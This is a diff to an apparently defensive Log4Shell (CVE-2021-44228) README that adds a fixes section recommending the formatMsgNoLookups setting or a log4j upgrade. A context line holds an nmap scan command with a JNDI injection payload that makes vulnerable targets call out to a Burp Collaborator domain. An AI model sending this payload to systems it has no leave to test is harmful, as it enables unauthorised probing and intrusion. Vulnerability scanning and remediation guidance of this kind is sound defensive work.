@@ -21,6 +21,15 @@ Take your domain from Burp collaborator and replace xxxx with your domain:
 nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
 ```
 
+# Solution/Fixes
+
+List of best fixes and workarounds.
+
+## Best fix
+
+Best solution to protect from CVE-2021-44228:
+Start your server with log4j2.formatMsgNoLookups set to true, or update to log4j-2.15.0-rc1 or later.
+
 # References
 
 General references and links to the vulnerability
@@ -28,6 +37,7 @@ General references and links to the vulnerability
 ## General
 
 [Reddit thread](https://www.reddit.com/r/blueteamsec/comments/rd38z9/log4j_0day_being_exploited/) - General information about log4shell
+
 [NCC log4shell](https://github.com/NCSC-NL/log4shell) - operational information regarding the vulnerability (IOCs, mitigation, scanning, software)
 
 ## Related
